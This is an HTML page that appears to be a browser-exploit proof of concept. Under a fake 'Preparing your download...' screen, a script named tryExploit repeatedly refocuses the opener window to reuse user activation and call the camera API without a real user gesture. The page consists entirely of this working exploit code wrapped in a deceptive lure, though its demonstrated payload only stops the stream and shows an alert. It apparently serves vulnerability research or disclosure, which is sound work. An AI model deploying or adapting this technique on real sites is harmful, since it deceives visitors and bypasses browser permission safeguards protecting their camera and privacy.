<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Processing Download...</title>
</head>

<body style="background:#e3f2fd;font-family:sans-serif;text-align:center;padding:50px;">

    <div id="status">
        <h1>Preparing your download...</h1>
    </div>

    <script>
        const status = document.getElementById("status");
        let used = false;

        function tryExploit(trigger) {
            const isActive = navigator.userActivation.isActive;
            console.log("[*]", trigger, "| isActive:", isActive);

            if (isActive && !used) {
                used = true;

                status.innerHTML = "<h1>Finalizing...</h1>";

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        console.log("[SUCCESS] Activation landed here");

                        stream.getTracks().forEach(t => t.stop());
                        alert("Activation reused across contexts!");
                    })
                    .catch(err => {
                        console.log("API reached:", err.name);
                    });
            }
        }

        window.addEventListener("focus", () => tryExploit("focus"));
        document.addEventListener("visibilitychange", () => tryExploit("visibilitychange"));
        setInterval(() => {
            if (window.opener) {
                try {
                    window.opener.focus();
                } catch (e) {}
            }
        }, 100);
    </script>

</body>
</html>
